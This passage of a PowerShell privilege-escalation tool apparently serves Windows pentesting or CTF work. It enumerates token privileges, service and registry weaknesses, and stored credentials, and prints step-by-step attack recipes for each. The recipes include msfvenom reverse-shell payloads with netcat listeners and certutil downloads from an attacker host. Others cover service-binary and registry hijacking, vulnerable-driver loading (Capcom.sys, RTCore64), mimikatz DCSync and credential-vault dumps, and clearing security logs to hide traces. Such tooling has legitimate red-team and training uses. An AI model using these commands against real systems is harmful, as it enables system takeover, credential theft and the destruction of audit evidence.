                -Attacker @(
                    'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe-service -o svc.exe',
                    'python3 -m http.server WEBPORT',
                    'nc -lvnp YOURPORT'
                ) `
                -Victim @(
                    '# Find service and its binary:',
                    'sc qc TargetService',
                    '',
                    '# Take ownership:',
                    'takeown /f "C:\Path\To\service.exe"',
                    'icacls "C:\Path\To\service.exe" /grant YOURUSER:F',
                    '',
                    '# Backup and replace:',
                    'move "C:\Path\To\service.exe" "C:\Path\To\service.exe.bak"',
                    'certutil -urlcache -f http://YOURIP:WEBPORT/svc.exe "C:\Path\To\service.exe"',
                    '',
                    'sc stop TargetService',
                    'sc start TargetService'
                ) `
                -Notes @('Own and replace service binary', 'Runs as SYSTEM')
            
            Write-Method -Number "6" -Title "Own registry key and modify" `
                -Attacker @() `
                -Victim @(
                    '# Take ownership of service registry key:',
                    '# Use regedit GUI or:',
                    '',
                    '# PowerShell to take ownership of registry:',
                    '$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\TargetService",[Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,[System.Security.AccessControl.RegistryRights]::TakeOwnership)',
                    '$acl = $key.GetAccessControl()',
                    '$owner = [System.Security.Principal.NTAccount]"YOURFULLUSER"',
                    '$acl.SetOwner($owner)',
                    '$key.SetAccessControl($acl)',
                    '',
                    '# Now modify ImagePath:',
                    'Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\TargetService" -Name "ImagePath" -Value "C:\evil.exe"'
                ) `
                -Notes @('Own registry key', 'Modify service config')
            
            Write-Method -Number "7" -Title "Own scheduled task file" `
                -Attacker @() `
                -Victim @(
                    '# Take ownership of task:',
                    'takeown /f C:\Windows\System32\Tasks\SomeTask',
                    'icacls C:\Windows\System32\Tasks\SomeTask /grant YOURUSER:F',
                    '',
                    '# Modify task or replace binary it runs'
                ) `
                -Notes @('Own scheduled task', 'Modify task definition')
            
            Write-Method -Number "8" -Title "Own any sensitive file" `
                -Attacker @() `
                -Victim @(
                    '# Take ownership and read:',
                    'takeown /f C:\Users\Administrator\Desktop\root.txt',
                    'icacls C:\Users\Administrator\Desktop\root.txt /grant YOURUSER:F',
                    'type C:\Users\Administrator\Desktop\root.txt',
                    '',
                    '# Take ownership of entire folder:',
                    'takeown /f C:\Users\Administrator /r /d y',
                    'icacls C:\Users\Administrator /grant YOURUSER:F /t'
                ) `
                -Notes @('Own any file/folder', '/r for recursive')
        }
        
        # =====================================================================
        # SeLoadDriverPrivilege - ALL METHODS
        # =====================================================================
        "SeLoadDriverPrivilege" {
            Write-SubSection "SeLoadDriverPrivilege - ALL METHODS"
            
            Write-Host ""
            Write-Host "  [INFO] Can load kernel-mode drivers!" -ForegroundColor Cyan
            Write-Host "  [INFO] Use vulnerable signed drivers (BYOVD)" -ForegroundColor Cyan
            
            Write-Method -Number "1" -Title "Capcom.sys (classic)" `
                -Attacker @(
                    'git clone https://github.com/FuzzySecurity/Capcom-Rootkit',
                    '# Get Capcom.sys and ExploitCapcom.exe',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/Capcom.sys WORKDIR\Capcom.sys',
                    'certutil -urlcache -f http://YOURIP:WEBPORT/ExploitCapcom.exe WORKDIR\ec.exe',
                    '',
                    '# Register driver:',
                    'reg add "HKCU\System\CurrentControlSet\Services\Capcom" /v Type /t REG_DWORD /d 1',
                    'reg add "HKCU\System\CurrentControlSet\Services\Capcom" /v Start /t REG_DWORD /d 3',
                    'reg add "HKCU\System\CurrentControlSet\Services\Capcom" /v ErrorControl /t REG_DWORD /d 1',
                    'reg add "HKCU\System\CurrentControlSet\Services\Capcom" /v ImagePath /t REG_SZ /d "\??\WORKDIR\Capcom.sys"',
                    '',
                    '# Run exploit:',
                    'WORKDIR\ec.exe'
                ) `
                -Notes @('Classic BYOVD', 'Kernel code execution')
            
            Write-Method -Number "2" -Title "RTCore64.sys (MSI Afterburner)" `
                -Attacker @(
                    '# Extract RTCore64.sys from MSI Afterburner',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/RTCore64.sys WORKDIR\RTCore64.sys',
                    '',
                    '# Use with PPLKiller or custom exploit',
                    '# Allows arbitrary kernel memory R/W'
                ) `
                -Notes @('From MSI Afterburner', 'Kernel R/W primitive')
            
            Write-Method -Number "3" -Title "DBUtil_2_3.sys (Dell)" `
                -Attacker @(
                    '# Get DBUtil_2_3.sys from Dell drivers (CVE-2021-21551)',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/DBUtil_2_3.sys WORKDIR\dbu.sys',
                    '',
                    '# Use with appropriate exploit'
                ) `
                -Notes @('CVE-2021-21551', 'Dell driver vulnerability')
            
            Write-Method -Number "4" -Title "EoP through driver loading (EoPLoadDriver)" `
                -Attacker @(
                    'git clone https://github.com/TarlogicSecurity/EoPLoadDriver',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/eoploaddriver.exe WORKDIR\eop.exe',
                    'certutil -urlcache -f http://YOURIP:WEBPORT/Capcom.sys WORKDIR\Capcom.sys',
                    '',
                    'WORKDIR\eop.exe System\CurrentControlSet\MyDriver WORKDIR\Capcom.sys'
                ) `
                -Notes @('Automated driver loading', 'Works from non-admin')
        }
        
        # =====================================================================
        # SeManageVolumePrivilege - ALL METHODS
        # =====================================================================
        "SeManageVolumePrivilege" {
            Write-SubSection "SeManageVolumePrivilege - ALL METHODS"
            
            Write-Method -Number "1" -Title "Access via Shadow Copy" `
                -Attacker @(
                    'impacket-secretsdump -sam SAM -system SYSTEM LOCAL'
                ) `
                -Victim @(
                    '# Create shadow:',
                    'wmic shadowcopy call create Volume=C:\',
                    '',
                    '# List shadows:',
                    'vssadmin list shadows',
                    '',
                    '# Access files from shadow:',
                    'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM WORKDIR\'
                ) `
                -Notes @('Create and access shadow copies', 'Bypass file locks')
            
            Write-Method -Number "2" -Title "Raw disk read (advanced)" `
                -Attacker @() `
                -Victim @(
                    '# This requires custom tooling',
                    '# SeManageVolumePrivilege allows raw disk access',
                    '# Can read NTFS structures directly'
                ) `
                -Notes @('Advanced technique', 'Requires custom tools')
        }
        
        # =====================================================================
        # SeTcbPrivilege
        # =====================================================================
        "SeTcbPrivilege" {
            Write-SubSection "SeTcbPrivilege - SYSTEM EQUIVALENT"
            
            Write-Host ""
            Write-Host "  [!!!] You have SeTcbPrivilege - this is SYSTEM equivalent!" -ForegroundColor Magenta
            Write-Host "  [!!!] You are part of the Trusted Computing Base!" -ForegroundColor Magenta
            Write-Host "  [!!!] You can create tokens for ANY user without password!" -ForegroundColor Magenta
            
            Write-Method -Number "1" -Title "Create arbitrary token" `
                -Attacker @() `
                -Victim @(
                    '# Use NtCreateToken API directly',
                    '# Can create token for any user including SYSTEM',
                    '# This is already full system compromise'
                ) `
                -Notes @('Already SYSTEM level', 'Can impersonate anyone')
        }
        
        # =====================================================================
        # SeCreateTokenPrivilege
        # =====================================================================
        "SeCreateTokenPrivilege" {
            Write-SubSection "SeCreateTokenPrivilege - ALL METHODS"
            
            Write-Method -Number "1" -Title "Create admin token with Tokenvator" `
                -Attacker @(
                    'git clone https://github.com/0xbadjuju/Tokenvator',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/Tokenvator.exe WORKDIR\tv.exe',
                    '',
                    'WORKDIR\tv.exe'
                ) `
                -Notes @('Create tokens with any privileges', 'Powerful privilege')
        }
        
        # =====================================================================
        # SeSyncAgentPrivilege
        # =====================================================================
        "SeSyncAgentPrivilege" {
            Write-SubSection "SeSyncAgentPrivilege - DCSync!"
            
            Write-Method -Number "1" -Title "DCSync with mimikatz" `
                -Attacker @(
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/mimikatz.exe WORKDIR\m.exe',
                    '',
                    'WORKDIR\m.exe "lsadump::dcsync /domain:DOMAIN.COM /user:Administrator" exit',
                    '',
                    '# Dump all users:',
                    'WORKDIR\m.exe "lsadump::dcsync /domain:DOMAIN.COM /all" exit'
                ) `
                -Notes @('DCSync attack', 'Get any domain hash')
            
            Write-Method -Number "2" -Title "DCSync with secretsdump (remote)" `
                -Attacker @(
                    'impacket-secretsdump DOMAIN/USER:PASS@DC_IP -just-dc'
                ) `
                -Victim @() `
                -Notes @('Remote DCSync', 'Dumps all domain hashes')
        }
        
        # =====================================================================
        # SeTrustedCredManAccessPrivilege
        # =====================================================================
        "SeTrustedCredManAccessPrivilege" {
            Write-SubSection "SeTrustedCredManAccessPrivilege - ALL METHODS"
            
            Write-Method -Number "1" -Title "Dump Credential Manager with mimikatz" `
                -Attacker @(
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/mimikatz.exe WORKDIR\m.exe',
                    '',
                    'WORKDIR\m.exe "vault::cred" "vault::list" exit'
                ) `
                -Notes @('Dump saved credentials', 'Web, Windows creds')
            
            Write-Method -Number "2" -Title "List with cmdkey/vaultcmd" `
                -Attacker @() `
                -Victim @(
                    'cmdkey /list',
                    '',
                    'vaultcmd /listcreds:"Windows Credentials" /all',
                    'vaultcmd /listcreds:"Web Credentials" /all'
                ) `
                -Notes @('Built-in tools', 'Shows stored creds')
        }
        
        # =====================================================================
        # SeSecurityPrivilege
        # =====================================================================
        "SeSecurityPrivilege" {
            Write-SubSection "SeSecurityPrivilege - ALL METHODS"
            
            Write-Method -Number "1" -Title "Clear security logs" `
                -Attacker @() `
                -Victim @(
                    '# Clear all logs:',
                    'wevtutil cl Security',
                    'wevtutil cl System',
                    'wevtutil cl Application',
                    'wevtutil cl "Windows PowerShell"',
                    '',
                    '# Disable auditing:',
                    'auditpol /clear /y'
                ) `
                -Notes @('Cover tracks', 'Clear evidence')
            
            Write-Method -Number "2" -Title "Read security events" `
                -Attacker @() `
                -Victim @(
                    '# Read security log for passwords in command line:',
                    'wevtutil qe Security /rd:true /f:text | findstr /i password',
                    '',
                    '# Export for offline analysis:',
                    'wevtutil epl Security WORKDIR\security.evtx'
                ) `
                -Notes @('May contain passwords', 'Process creation events')
        }
        
        # =====================================================================
        # SeRelabelPrivilege
        # =====================================================================
        "SeRelabelPrivilege" {
            Write-SubSection "SeRelabelPrivilege - ALL METHODS"
            
            Write-Method -Number "1" -Title "Lower file integrity" `
                -Attacker @() `
                -Victim @(
                    '# Lower integrity of protected file:',
                    'icacls C:\Windows\System32\target.exe /setintegritylevel Low',
                    '',
                    '# Now can modify files protected by integrity'
                ) `
                -Notes @('Bypass MIC protection', 'Lower integrity levels')
        }
        
        # =====================================================================
        # SeCreateSymbolicLinkPrivilege
        # =====================================================================
        "SeCreateSymbolicLinkPrivilege" {
            Write-SubSection "SeCreateSymbolicLinkPrivilege - ALL METHODS"
            
            Write-Method -Number "1" -Title "Symlink attacks" `
                -Attacker @() `
                -Victim @(
                    '# Create junction point:',
                    'mklink /j C:\Link C:\Windows\System32',
                    '',
                    '# Create symbolic link:',
                    'mklink C:\link.txt C:\Windows\System32\config\SAM',
                    '',
                    '# NTFS reparse point attacks possible'
                ) `
                -Notes @('Symlink/junction attacks', 'Redirect file access')
        }
        
        # =====================================================================
        # SeMachineAccountPrivilege
        # =====================================================================
        "SeMachineAccountPrivilege" {
            Write-SubSection "SeMachineAccountPrivilege - ALL METHODS"
            
            Write-Method -Number "1" -Title "Add computer account (RBCD attack)" `
                -Attacker @(
                    'impacket-addcomputer DOMAIN/USER:PASS -computer-name EVIL$ -computer-pass Password123',
                    '',
                    '# Then abuse via RBCD if you have write access to another computer'
                ) `
                -Victim @(
                    '# PowerShell:',
                    'New-ADComputer -Name "EVIL" -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force)'
                ) `
                -Notes @('MAQ abuse', 'Useful for RBCD attacks')
        }
        
        # =====================================================================
        # SeEnableDelegationPrivilege
        # =====================================================================
        "SeEnableDelegationPrivilege" {
            Write-SubSection "SeEnableDelegationPrivilege - ALL METHODS"
            
            Write-Method -Number "1" -Title "Configure unconstrained delegation" `
                -Attacker @() `
                -Victim @(
                    '# Enable unconstrained delegation on computer:',
                    'Set-ADComputer -Identity "YOURCOMPUTER" -TrustedForDelegation $true',
                    '',
                    '# Then capture TGTs from connecting users'
                ) `
                -Notes @('Kerberos delegation abuse', 'Capture TGTs')
        }
    }
}

# ============================================================================
# SERVICE VULNERABILITIES
# ============================================================================

function Get-ServiceVulns {
    Write-Section "SERVICE VULNERABILITIES"
    
    Write-Host "[*] Checking unquoted service paths..." -ForegroundColor Gray
    
    $services = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue | Where-Object {
        $_.PathName -and
        $_.PathName -notmatch '^"' -and
        $_.PathName -notmatch '^C:\\Windows\\' -and
        $_.PathName -match '\s' -and
        $_.PathName -match '\.exe'
    }
    
    if ($services) {
        foreach ($svc in $services) {
            Write-Finding -Cat "SERVICE" -Name "Unquoted: $($svc.Name)" -Sev "HIGH" -Details $svc.PathName
        }
    } else {
        Write-Host "[*] No unquoted paths found" -ForegroundColor Gray
    }
}

# ============================================================================
# REGISTRY VULNERABILITIES
# ============================================================================

function Get-RegistryVulns {
    Write-Section "REGISTRY VULNERABILITIES"
    
    Write-Host "[*] Checking AlwaysInstallElevated..." -ForegroundColor Gray
    
    $hklm = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
    $hkcu = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
    
    if ($hklm -eq 1 -and $hkcu -eq 1) {
        Write-Finding -Cat "REGISTRY" -Name "AlwaysInstallElevated" -Sev "CRITICAL" -Details "MSI runs as SYSTEM"
        
        Write-Method -Number "1" -Title "MSI Payload" `
            -Attacker @(
                'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f msi -o evil.msi',
                'python3 -m http.server WEBPORT',
                'nc -lvnp YOURPORT'
            ) `
            -Victim @(
                'certutil -urlcache -f http://YOURIP:WEBPORT/evil.msi WORKDIR\evil.msi',
                'msiexec /quiet /qn /i WORKDIR\evil.msi'
            ) `
            -Notes @('MSI installs as SYSTEM', 'Silent installation')
    } else {
        Write-Host "[*] AlwaysInstallElevated not enabled" -ForegroundColor Gray
    }
}

# ============================================================================
# CREDENTIAL HUNTING
# ============================================================================

function Find-Credentials {
    Write-Section "CREDENTIAL HUNTING"
    
    Write-Host "[*] Stored credentials..." -ForegroundColor Gray
    $cmdkey = cmdkey /list 2>$null
    if ($cmdkey -match "Target:") {
        Write-Finding -Cat "CREDS" -Name "Stored Credentials" -Sev "MEDIUM" -Details "Found via cmdkey"
        Write-Host $cmdkey
    }
    
    Write-Host ""
    Write-Host "[*] Common files..." -ForegroundColor Gray
    @(
        "C:\Windows\Panther\Unattend.xml",
        "C:\Windows\Panther\unattend.xml",
        "C:\sysprep.inf",
        "C:\unattend.xml"
    ) | ForEach-Object {
        if (Test-Path $_ -ErrorAction SilentlyContinue) {
            Write-Finding -Cat "CREDS" -Name $_ -Sev "HIGH" -Details "May contain passwords"
        }
    }
    
    # PowerShell history
    $psHist = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $psHist -ErrorAction SilentlyContinue) {
        Write-Finding -Cat "CREDS" -Name "PowerShell History" -Sev "MEDIUM" -Details $psHist
    }
}

# ============================================================================
# KERNEL EXPLOITS
# ============================================================================

function Get-KernelVulns {
    Write-Section "KERNEL VULNERABILITIES"
    
    $os = Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue
    if ($os) {
        Write-Host "[*] OS: $($os.Caption)" -ForegroundColor Gray
        Write-Host "[*] Build: $($os.BuildNumber)" -ForegroundColor Gray
        
        $spooler = Get-Service Spooler -ErrorAction SilentlyContinue
        if ($spooler.Status -eq 'Running' -and [int]$os.BuildNumber -lt 19041) {
            Write-Finding -Cat "KERNEL" -Name "PrintNightmare (CVE-2021-1675)" -Sev "CRITICAL" -Details "Print Spooler vulnerable"
        }
    }
    
    Write-Host ""
    Write-Host "[*] For comprehensive analysis:" -ForegroundColor Yellow
    Write-Host "    systeminfo > sysinfo.txt" -ForegroundColor White
    Write-Host "    python windows-exploit-suggester.py --systeminfo sysinfo.txt" -ForegroundColor White
}

# ============================================================================
# MAIN
# ============================================================================

function Start-Scan {
    Write-Banner
    
    if (-not $Script:Config.AttackerIP) {
        $Script:Config.AttackerIP = Read-Host "Enter attacker IP"
    }
    
    Write-Host ""
    Write-Host "[*] Attacker: $($Script:Config.AttackerIP):$($Script:Config.AttackerPort)" -ForegroundColor Gray
    Write-Host "[*] Web Port: $($Script:Config.WebPort)" -ForegroundColor Gray
    Write-Host "[*] Current User: $Script:FullUser" -ForegroundColor Gray
    
    Get-SystemInfo
    Get-GroupMemberships
    Get-PrivilegeInfo
    Get-ServiceVulns
    Get-RegistryVulns
    Find-Credentials
    Get-KernelVulns
    
    Write-Section "SCAN COMPLETE"
    Write-Host ""
    Write-Host "[*] Quick setup:" -ForegroundColor Yellow
    Write-Host "    nc -lvnp $($Script:Config.AttackerPort)" -ForegroundColor White
    Write-Host "    python3 -m http.server $($Script:Config.WebPort)" -ForegroundColor White
    Write-Host ""
}

Start-Scan
